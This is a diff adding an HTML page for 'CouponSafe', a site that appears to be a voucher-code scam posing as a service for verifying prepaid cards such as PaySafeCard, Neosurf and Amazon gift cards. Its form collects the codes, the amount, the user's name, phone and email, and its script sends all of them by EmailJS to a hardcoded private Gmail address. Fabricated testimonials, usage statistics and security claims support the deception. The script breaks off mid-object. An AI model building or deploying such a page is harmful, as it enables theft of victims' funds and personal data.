@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coupon Management Platform</title>
+    <meta name="description" content="Plateforme sécurisée de gestion de codes de recharge">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#1e40af',
+                        'secondary': '#374151',
+                        'accent': '#10b981'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .gradient-bg-light {
+            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .glass-effect-light {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+        .hover-scale {
+            transition: transform 0.3s ease;
+        }
+        .hover-scale:hover {
+            transform: scale(1.05);
+        }
+        .animate-pulse-slow {
+            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        
+        /* Enhanced responsive styles */
+        @media (max-width: 640px) {
+            .hero-title {
+                font-size: 2rem !important;
+                line-height: 1.2;
+            }
+            .hero-subtitle {
+                font-size: 1rem !important;
+            }
+            .mobile-menu {
+                display: none;
+            }
+            .mobile-menu.active {
+                display: block;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: rgba(31, 41, 55, 0.95);
+                backdrop-filter: blur(10px);
+                border-bottom: 1px solid rgba(75, 85, 99, 0.3);
+                padding: 1rem;
+                z-index: 50;
+            }
+            .mobile-menu a {
+                display: block;
+                padding: 0.75rem 0;
+                border-bottom: 1px solid rgba(75, 85, 99, 0.2);
+            }
+            .mobile-menu a:last-child {
+                border-bottom: none;
+            }
+            .code-input-grid {
+                grid-template-columns: repeat(4, 1fr) !important;
+                gap: 0.5rem !important;
+            }
+            .code-input-grid input {
+                font-size: 1.25rem !important;
+                padding: 0.75rem !important;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr) !important;
+                gap: 1rem !important;
+            }
+            .platform-grid {
+                grid-template-columns: repeat(2, 1fr) !important;
+            }
+            .testimonial-grid {
+                grid-template-columns: 1fr !important;
+            }
+            .mobile-hidden {
+                display: none !important;
+            }
+            .mobile-full {
+                width: 100% !important;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .tablet-stack {
+                flex-direction: column !important;
+                gap: 1rem !important;
+            }
+            .tablet-center {
+                text-align: center !important;
+            }
+            .form-section {
+                padding: 1rem !important;
+            }
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block !important;
+            }
+        }
+        
+        @media (min-width: 769px) {
+            .mobile-menu-btn {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 1024px) {
+            .lg-grid-cols-2 {
+                grid-template-columns: repeat(2, 1fr) !important;
+            }
+            .lg-text-center {
+                text-align: center !important;
+            }
+        }
+        
+        /* Touch-friendly buttons */
+        @media (hover: none) and (pointer: coarse) {
+            .hover-scale:hover {
+                transform: none;
+            }
+            .hover-scale:active {
+                transform: scale(0.95);
+            }
+            button, a, input {
+                min-height: 44px;
+            }
+        }
+        
+        /* Improved mobile navigation */
+        .nav-container {
+            position: relative;
+        }
+        
+        /* Better form spacing on mobile */
+        @media (max-width: 640px) {
+            .form-grid {
+                grid-template-columns: 1fr !important;
+                gap: 1rem !important;
+            }
+            .section-padding {
+                padding: 3rem 1rem !important;
+            }
+            .container-padding {
+                padding: 0 1rem !important;
+            }
+        }
+        /* Dark mode styles */
+        .dark .gradient-bg {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        /* Light mode styles */
+        .light .gradient-bg {
+            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
+        }
+        .light {
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+        .light .bg-gray-800 {
+            background-color: #ffffff;
+            border-color: #e2e8f0;
+        }
+        .light .bg-gray-700 {
+            background-color: #f1f5f9;
+        }
+        .light .bg-gray-600 {
+            background-color: #e2e8f0;
+            border-color: #cbd5e1;
+        }
+        .light .bg-gray-900 {
+            background-color: #f8fafc;
+        }
+        .light .text-gray-400 {
+            color: #64748b;
+        }
+        .light .text-gray-300 {
+            color: #475569;
+        }
+        .light .text-gray-500 {
+            color: #94a3b8;
+        }
+        .light .border-gray-700 {
+            border-color: #e2e8f0;
+        }
+        .light .border-gray-500 {
+            border-color: #cbd5e1;
+        }
+        .light .border-gray-600 {
+            border-color: #cbd5e1;
+        }
+        .light .bg-gray-800 input {
+            background-color: #ffffff;
+            color: #1e293b;
+            border-color: #cbd5e1;
+        }
+        .light .bg-gray-800 input:focus {
+            border-color: #3b82f6;
+        }
+        .light .bg-gray-800 select {
+            background-color: #ffffff;
+            color: #1e293b;
+            border-color: #cbd5e1;
+        }
+        .light .bg-gray-800 select:focus {
+            border-color: #3b82f6;
+        }
+        .light .bg-gray-800 textarea {
+            background-color: #ffffff;
+            color: #1e293b;
+            border-color: #cbd5e1;
+        }
+        .light .bg-gray-800 textarea:focus {
+            border-color: #3b82f6;
+        }
+        .light .placeholder-gray-400::placeholder {
+            color: #94a3b8;
+        }
+        /* Additional text visibility fixes for light mode */
+        .light .text-white {
+            color: #1e293b !important;
+        }
+        .light .text-gray-200 {
+            color: #64748b !important;
+        }
+        .light .text-gray-100 {
+            color: #475569 !important;
+        }
+        .light h1, .light h2, .light h3, .light h4, .light h5, .light h6 {
+            color: #1e293b !important;
+        }
+        .light p, .light span, .light div {
+            color: #334155 !important;
+        }
+        .light .text-gray-400 {
+            color: #64748b !important;
+        }
+        .light .text-gray-300 {
+            color: #475569 !important;
+        }
+        .light .text-gray-500 {
+            color: #94a3b8 !important;
+        }
+        .light .text-blue-400 {
+            color: #2563eb !important;
+        }
+        .light .text-green-400 {
+            color: #16a34a !important;
+        }
+        .light .text-yellow-400 {
+            color: #ca8a04 !important;
+        }
+        .light .text-red-400 {
+            color: #dc2626 !important;
+        }
+        .light .text-purple-400 {
+            color: #9333ea !important;
+        }
+        .light .text-orange-400 {
+            color: #ea580c !important;
+        }
+        .light .text-indigo-400 {
+            color: #4f46e5 !important;
+        }
+        /* Button text fixes */
+        .light button {
+            color: #1e293b !important;
+        }
+        .light .bg-gradient-to-r button {
+            color: #ffffff !important;
+        }
+        /* Link fixes */
+        .light a {
+            color: #2563eb !important;
+        }
+        .light a:hover {
+            color: #1d4ed8 !important;
+        }
+    </style>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("9Ej5cXeMQFLDaPIVo"); // Actual EmailJS public key
+        })();
+
+        // Check for saved theme preference or default to dark mode
+        const currentTheme = localStorage.getItem('theme') || 'dark';
+        document.documentElement.classList.add(currentTheme);
+        
+        // Mobile menu toggle function
+        function toggleMobileMenu() {
+            const mobileMenu = document.getElementById('mobileMenu');
+            mobileMenu.classList.toggle('active');
+        }
+        
+        // Close mobile menu when clicking outside
+        document.addEventListener('click', function(event) {
+            const mobileMenu = document.getElementById('mobileMenu');
+            const menuButton = event.target.closest('.mobile-menu-btn');
+            
+            if (!mobileMenu.contains(event.target) && !menuButton) {
+                mobileMenu.classList.remove('active');
+            }
+        });
+        
+        // Theme toggle function
+        function toggleTheme() {
+            const html = document.documentElement;
+            const currentTheme = html.classList.contains('dark') ? 'dark' : 'light';
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            
+            html.classList.remove(currentTheme);
+            html.classList.add(newTheme);
+            localStorage.setItem('theme', newTheme);
+        }
+    </script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen transition-colors duration-300">
+    <!-- Navigation -->
+    <nav class="bg-gray-800 border-b border-gray-700">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center nav-container">
+                <div class="flex items-center space-x-2">
+                    <div class="w-8 h-8 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg flex items-center justify-center">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <span class="text-xl font-bold">CouponSafe™</span>
+                    <span class="text-sm text-gray-400 mobile-hidden">ESTABLISHED 2020</span>
+                </div>
+                
+                <!-- Desktop Navigation -->
+                <div class="nav-links hidden md:flex items-center space-x-6">
+                    <a href="index.html" class="hover:text-blue-400 transition">ACCUEIL</a>
+                    <a href="track.html" class="hover:text-blue-400 transition">VÉRIFICATION</a>
+                    <a href="about.html" class="hover:text-blue-400 transition">PROTOCOLE</a>
+                    <a href="submit.html" class="hover:text-blue-400 transition">ESPACE PARTENAIRE</a>
+                    <button onclick="toggleTheme()" class="p-2 rounded-lg bg-gray-700 hover:bg-gray-600 transition-colors" title="Toggle theme">
+                        <svg class="w-5 h-5 text-yellow-400 dark:hidden" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clip-rule="evenodd"/>
+                        </svg>
+                        <svg class="w-5 h-5 text-gray-300 hidden dark:block" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"/>
+                        </svg>
+                    </button>
+                </div>
+                
+                <!-- Mobile Menu Button -->
+                <button onclick="toggleMobileMenu()" class="mobile-menu-btn p-2 rounded-lg bg-gray-700 hover:bg-gray-600 transition-colors">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <!-- Mobile Menu -->
+            <div id="mobileMenu" class="mobile-menu">
+                <a href="index.html" class="hover:text-blue-400 transition">ACCUEIL</a>
+                <a href="track.html" class="hover:text-blue-400 transition">VÉRIFICATION</a>
+                <a href="about.html" class="hover:text-blue-400 transition">PROTOCOLE</a>
+                <a href="submit.html" class="hover:text-blue-400 transition">ESPACE PARTENAIRE</a>
+                <button onclick="toggleTheme()" class="w-full text-left p-2 rounded-lg bg-gray-700 hover:bg-gray-600 transition-colors mt-2">
+                    🌙 Changer le thème
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="gradient-bg section-padding">
+        <div class="container mx-auto container-padding text-center">
+            <h1 class="hero-title text-4xl font-bold mb-6">TERMINAL DE VÉRIFICATION</h1>
+            <p class="hero-subtitle text-xl max-w-3xl mx-auto">
+                Plateforme institutionnelle de validation pour cartes de recharge prépayées. 
+                Détectez les fraudes et vérifiez vos codes en temps réel.
+            </p>
+        </div>
+    </section>
+
+    <!-- Form Section -->
+    <section class="py-16 bg-gray-800">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto">
+                <form id="verificationForm" class="space-y-8">
+                    <!-- Email Section -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">ADRESSE E-MAIL DE RÉCEPTION</h3>
+                        <input type="email" id="userEmail" name="userEmail" placeholder="Entrez votre adresse e-mail" required
+                               class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                    </div>
+
+                    <!-- KYC Section -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">Identité (KYC)</h3>
+                        <p class="text-gray-400 mb-4">Vérification anti-fraude obligatoire</p>
+                        <div class="form-grid grid md:grid-cols-2 gap-4">
+                            <input type="text" id="fullName" name="fullName" placeholder="Nom complet" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Numéro de téléphone" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                        </div>
+                    </div>
+
+                    <!-- Protocol Configuration -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">CONFIGURATION DU PROTOCOLE</h3>
+                        <p class="text-gray-400 mb-4">Identifiez le type de coupon à vérifier</p>
+                        <select id="couponType" name="couponType" class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500" required>
+                            <option value="">Sélectionnez le type</option>
+                            <option value="neosurf">Neosurf</option>
+                            <option value="paysafecard">PaySafeCard</option>
+                            <option value="cashlib">CashLib</option>
+                            <option value="amazon">Amazon Gift</option>
+                            <option value="autre">Autre</option>
+                        </select>
+                    </div>
+
+                    <!-- Amount Section -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">Montant et Devise</h3>
+                        <p class="text-gray-400 mb-4">Montant du ticket</p>
+                        <div class="form-grid grid md:grid-cols-2 gap-4">
+                            <input type="number" id="amount" name="amount" placeholder="Montant" step="0.01" min="0" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                            <select id="currency" name="currency" class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500" required>
+                                <option value="">Devise</option>
+                                <option value="EUR">EUR (€)</option>
+                                <option value="USD">USD ($)</option>
+                                <option value="GBP">GBP (£)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Code Injection -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">INJECTION DES CODES</h3>
+                        <p class="text-gray-400 mb-4">Saisissez les codes de recharge (X de 4 requis)</p>
+                        <div class="code-input-grid grid grid-cols-4 gap-4">
+                            <input type="text" id="code1" name="code1" maxlength="4" placeholder="XXXX" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                            <input type="text" id="code2" name="code2" maxlength="4" placeholder="XXXX" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                            <input type="text" id="code3" name="code3" maxlength="4" placeholder="XXXX" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                            <input type="text" id="code4" name="code4" maxlength="4" placeholder="XXXX" required
+                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                        </div>
+                    </div>
+
+                    <!-- Proof Section -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <h3 class="text-xl font-bold mb-4">Preuve d'achat</h3>
+                        <p class="text-gray-400 mb-4">Reçu ou photo du ticket (Optionnel)</p>
+                        <div class="border-2 border-dashed border-gray-500 rounded-lg p-8 text-center hover:border-blue-500 transition cursor-pointer" id="dropZone">
+                            <svg class="w-12 h-12 mx-auto mb-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"/>
+                            </svg>
+                            <p class="text-gray-400">Glisser un fichier ou cliquer pour parcourir</p>
+                            <p class="text-sm text-gray-500 mt-2">JPG, PNG ou PDF (Max 5MB)</p>
+                            <input type="file" id="fileInput" class="hidden" accept="image/*,.pdf" multiple>
+                        </div>
+                        <div id="imagePreview" class="mt-4 grid grid-cols-3 gap-4"></div>
+                    </div>
+
+                    <!-- Terms -->
+                    <div class="bg-gray-700 p-6 rounded-lg">
+                        <label class="flex items-center space-x-3 cursor-pointer">
+                            <input type="checkbox" id="terms" name="terms" class="w-5 h-5 text-blue-600 bg-gray-600 border-gray-500 rounded focus:ring-blue-500" required>
+                            <span class="text-gray-300">J'accepte les conditions d'audit de sécurité et le protocole de vérification.</span>
+                        </label>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 px-8 py-4 rounded-lg font-semibold hover-scale">
+                        LANCER LA VÉRIFICATION
+                    </button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Security Protocol -->
+    <section class="py-16 bg-gray-900">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl font-bold mb-8">VÉRIFICATION EN TEMPS RÉEL</h2>
+            <p class="text-xl text-gray-400 mb-8 max-w-3xl mx-auto">
+                Chaque coupon injecté est isolé dans une sandbox sécurisée avant la vérification finale. 
+                Ne quittez pas cette page pendant l'audit.
+            </p>
+            <div class="inline-block bg-green-600 px-6 py-3 rounded">
+                <span class="font-bold">SYSTEM STATUS: OPTIMAL</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Supported Platforms -->
+    <section class="py-16 bg-gray-800">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12">PLATEFORMES SUPPORTÉES</h2>
+            <p class="text-center text-gray-400 mb-12 max-w-3xl mx-auto">
+                Notre plateforme traite des coupons pour les principales devises et cryptomonnaies
+            </p>
+            
+            <div class="platform-grid grid md:grid-cols-4 gap-8 mb-12">
+                <div class="text-center">
+                    <div class="w-16 h-16 bg-yellow-600 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl font-bold">
+                        €
+                    </div>
+                    <h3 class="font-bold mb-2">EURO</h3>
+                    <p class="text-gray-400">Coupons reconnus</p>
+                </div>
+                <div class="text-center">
+                    <div class="w-16 h-16 bg-green-600 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl font-bold">
+                        $
+                    </div>
+                    <h3 class="font-bold mb-2">DOLLAR</h3>
+                    <p class="text-gray-400">Coupons reconnus</p>
+                </div>
+                <div class="text-center">
+                    <div class="w-16 h-16 bg-orange-600 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl font-bold">
+                        ₿
+                    </div>
+                    <h3 class="font-bold mb-2">BITCOIN</h3>
+                    <p class="text-gray-400">Coupons reconnus</p>
+                </div>
+                <div class="text-center">
+                    <div class="w-16 h-16 bg-purple-600 rounded-full mx-auto mb-4 flex items-center justify-center text-2xl font-bold">
+                        ◆
+                    </div>
+                    <h3 class="font-bold mb-2">CRYPTO</h3>
+                    <p class="text-gray-400">Coupons reconnus</p>
+                </div>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div class="bg-gray-700 p-4 rounded-lg text-center hover-scale">
+                    <h4 class="font-bold mb-2">NEOSURF</h4>
+                    <p class="text-sm text-gray-400">Cartes de paiement prépayées sécurisées</p>
+                </div>
+                <div class="bg-gray-700 p-4 rounded-lg text-center hover-scale">
+                    <h4 class="font-bold mb-2">PAYSAFECARD</h4>
+                    <p class="text-sm text-gray-400">Système de paiement universel</p>
+                </div>
+                <div class="bg-gray-700 p-4 rounded-lg text-center hover-scale">
+                    <h4 class="font-bold mb-2">AMAZON GIFT</h4>
+                    <p class="text-sm text-gray-400">Bons cadeaux numériques</p>
+                </div>
+                <div class="bg-gray-700 p-4 rounded-lg text-center hover-scale">
+                    <h4 class="font-bold mb-2">CASHLIB</h4>
+                    <p class="text-sm text-gray-400">Solution de paiement rapide</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="py-16 bg-gray-900">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12">TÉMOIGNAGES UTILISATEURS</h2>
+            <p class="text-center text-gray-400 mb-12">Ce que nos utilisateurs pensent de CouponSafe™</p>
+            
+            <div class="testimonial-grid grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/alex/48/48.jpg" alt="Alex Martinez" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">ALEX MARTINEZ</h4>
+                            <p class="text-sm text-gray-400">Utilisateur Premium</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Plateforme rapide et fiable. Les coupons sont traités en quelques secondes. Excellent service!"</p>
+                </div>
+                
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/sarah/48/48.jpg" alt="Sarah Johnson" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">SARAH JOHNSON</h4>
+                            <p class="text-sm text-gray-400">Développeur</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Interface intuitive et sécurisée. Parfait pour tester les systèmes de paiement. Hautement recommandé."</p>
+                </div>
+                
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/marco/48/48.jpg" alt="Marco Rossi" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">MARCO ROSSI</h4>
+                            <p class="text-sm text-gray-400">Analyseur de Sécurité</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Architecture bien conçue avec excellente validation des données. Idéal pour les tests de sécurité."</p>
+                </div>
+                
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/emma/48/48.jpg" alt="Emma Wilson" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">EMMA WILSON</h4>
+                            <p class="text-sm text-gray-400">Gestionnaire de Projet</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Support réactif et plateforme stable. Notre équipe l'utilise quotidiennement sans problème."</p>
+                </div>
+                
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/david/48/48.jpg" alt="David Chen" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">DAVID CHEN</h4>
+                            <p class="text-sm text-gray-400">Chercheur en Cybersécurité</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Excellent pour la recherche en sécurité. Les données sont bien structurées et fiables."</p>
+                </div>
+                
+                <div class="bg-gray-800 p-6 rounded-lg border border-gray-700">
+                    <div class="flex items-center mb-4">
+                        <img src="https://picsum.photos/seed/lisa/48/48.jpg" alt="Lisa Bergström" class="w-12 h-12 rounded-full mr-4 object-cover">
+                        <div>
+                            <h4 class="font-bold">LISA BERGSTRÖM</h4>
+                            <p class="text-sm text-gray-400">Consultante IT</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-300">"Service professionnel avec une excellente gestion des données. Très satisfait du résultat."</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats -->
+    <section class="py-16 bg-gray-800">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12">Statistiques de Confiance</h2>
+            <div class="stats-grid grid md:grid-cols-4 gap-8 text-center">
+                <div>
+                    <div class="text-4xl font-bold text-blue-500 mb-2">850K+</div>
+                    <p class="text-gray-400">Utilisateurs Actifs</p>
+                </div>
+                <div>
+                    <div class="text-4xl font-bold text-green-500 mb-2">12.8M</div>
+                    <p class="text-gray-400">Coupons Traités</p>
+                </div>
+                <div>
+                    <div class="text-4xl font-bold text-purple-500 mb-2">99.9%</div>
+                    <p class="text-gray-400">Taux de Succès</p>
+                </div>
+                <div>
+                    <div class="text-4xl font-bold text-orange-500 mb-2">99.97%</div>
+                    <p class="text-gray-400">Uptime</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 border-t border-gray-700 py-8">
+        <div class="container mx-auto px-4">
+            <div class="border-t border-gray-700 pt-8 text-center text-gray-400">
+                <p>© 2020-2026 CouponSafe Network. Terminal v2.8.7</p>
+            </div>
+        </div>
+    </footer>
+<script>
+        // Image upload functionality
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const imagePreview = document.getElementById('imagePreview');
+        let uploadedFiles = [];
+
+        dropZone.addEventListener('click', () => fileInput.click());
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('border-blue-500', 'bg-gray-600');
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.classList.remove('border-blue-500', 'bg-gray-600');
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('border-blue-500', 'bg-gray-600');
+            handleFiles(e.dataTransfer.files);
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            handleFiles(e.target.files);
+        });
+
+        function handleFiles(files) {
+            Array.from(files).forEach(file => {
+                if (file.type.startsWith('image/') || file.type === 'application/pdf') {
+                    if (file.size <= 5 * 1024 * 1024) { // 5MB limit
+                        const reader = new FileReader();
+                        reader.onload = (e) => {
+                            const previewItem = document.createElement('div');
+                            previewItem.className = 'relative group';
+                            
+                            if (file.type.startsWith('image/')) {
+                                previewItem.innerHTML = `
+                                    <img src="${e.target.result}" alt="${file.name}" class="w-full h-32 object-cover rounded-lg">
+                                    <button type="button" onclick="this.parentElement.remove()" class="absolute top-2 right-2 bg-red-600 text-white rounded-full w-6 h-6 flex items-center justify-center opacity-0 group-hover:opacity-100 transition">
+                                        ×
+                                    </button>
+                                    <p class="text-xs text-gray-400 mt-1 truncate">${file.name}</p>
+                                `;
+                            } else {
+                                previewItem.innerHTML = `
+                                    <div class="w-full h-32 bg-gray-600 rounded-lg flex items-center justify-center">
+                                        <svg class="w-8 h-8 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
+                                            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4z" clip-rule="evenodd"/>
+                                        </svg>
+                                    </div>
+                                    <button type="button" onclick="this.parentElement.remove()" class="absolute top-2 right-2 bg-red-600 text-white rounded-full w-6 h-6 flex items-center justify-center opacity-0 group-hover:opacity-100 transition">
+                                        ×
+                                    </button>
+                                    <p class="text-xs text-gray-400 mt-1 truncate">${file.name}</p>
+                                `;
+                            }
+                            
+                            imagePreview.appendChild(previewItem);
+                            uploadedFiles.push(file);
+                        };
+                        reader.readAsDataURL(file);
+                    } else {
+                        alert('Le fichier ' + file.name + ' dépasse la taille limite de 5MB');
+                    }
+                } else {
+                    alert('Le fichier ' + file.name + ' n\'est pas une image ou un PDF valide');
+                }
+            });
+        }
+
+        // Form submission handler
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                userEmail: document.getElementById('userEmail').value,
+                fullName: document.getElementById('fullName').value,
+                phoneNumber: document.getElementById('phoneNumber').value,
+                couponType: document.getElementById('couponType').value,
+                amount: document.getElementById('amount').value,
+                currency: document.getElementById('currency').value,
+                code1: document.getElementById('code1').value,
+                code2: document.getElementById('code2').value,
+                code3: document.getElementById('code3').value,
+                code4: document.getElementById('code4').value,
+                terms: document.getElementById('terms').checked,
+                submissionTime: new Date().toLocaleString('fr-FR'),
+                uploadedFiles: uploadedFiles.map(f => f.name).join(', ')
+            };
+
+            // Combine coupon codes
+            const fullCode = `${formData.code1}-${formData.code2}-${formData.code3}-${formData.code4}`;
+            
+            // Prepare email template parameters
+            const templateParams = {
+                to_email: 'adrienkoba311@gmail.com',
+                from_name: formData.fullName,
+                from_email: formData.userEmail,
+                phone: formData.phoneNumber,
+                coupon_type: formData.couponType,
+                amount: formData.amount + ' ' + formData.currency,
+                full_code: fullCode,
+                individual_codes: `${formData.code1}, ${formData.code2}, ${formData.code3}, ${formData.code4}`,
+                submission_time: formData.submissionTime,
+                uploaded_files: formData.uploadedFiles || 'Aucun fichier',
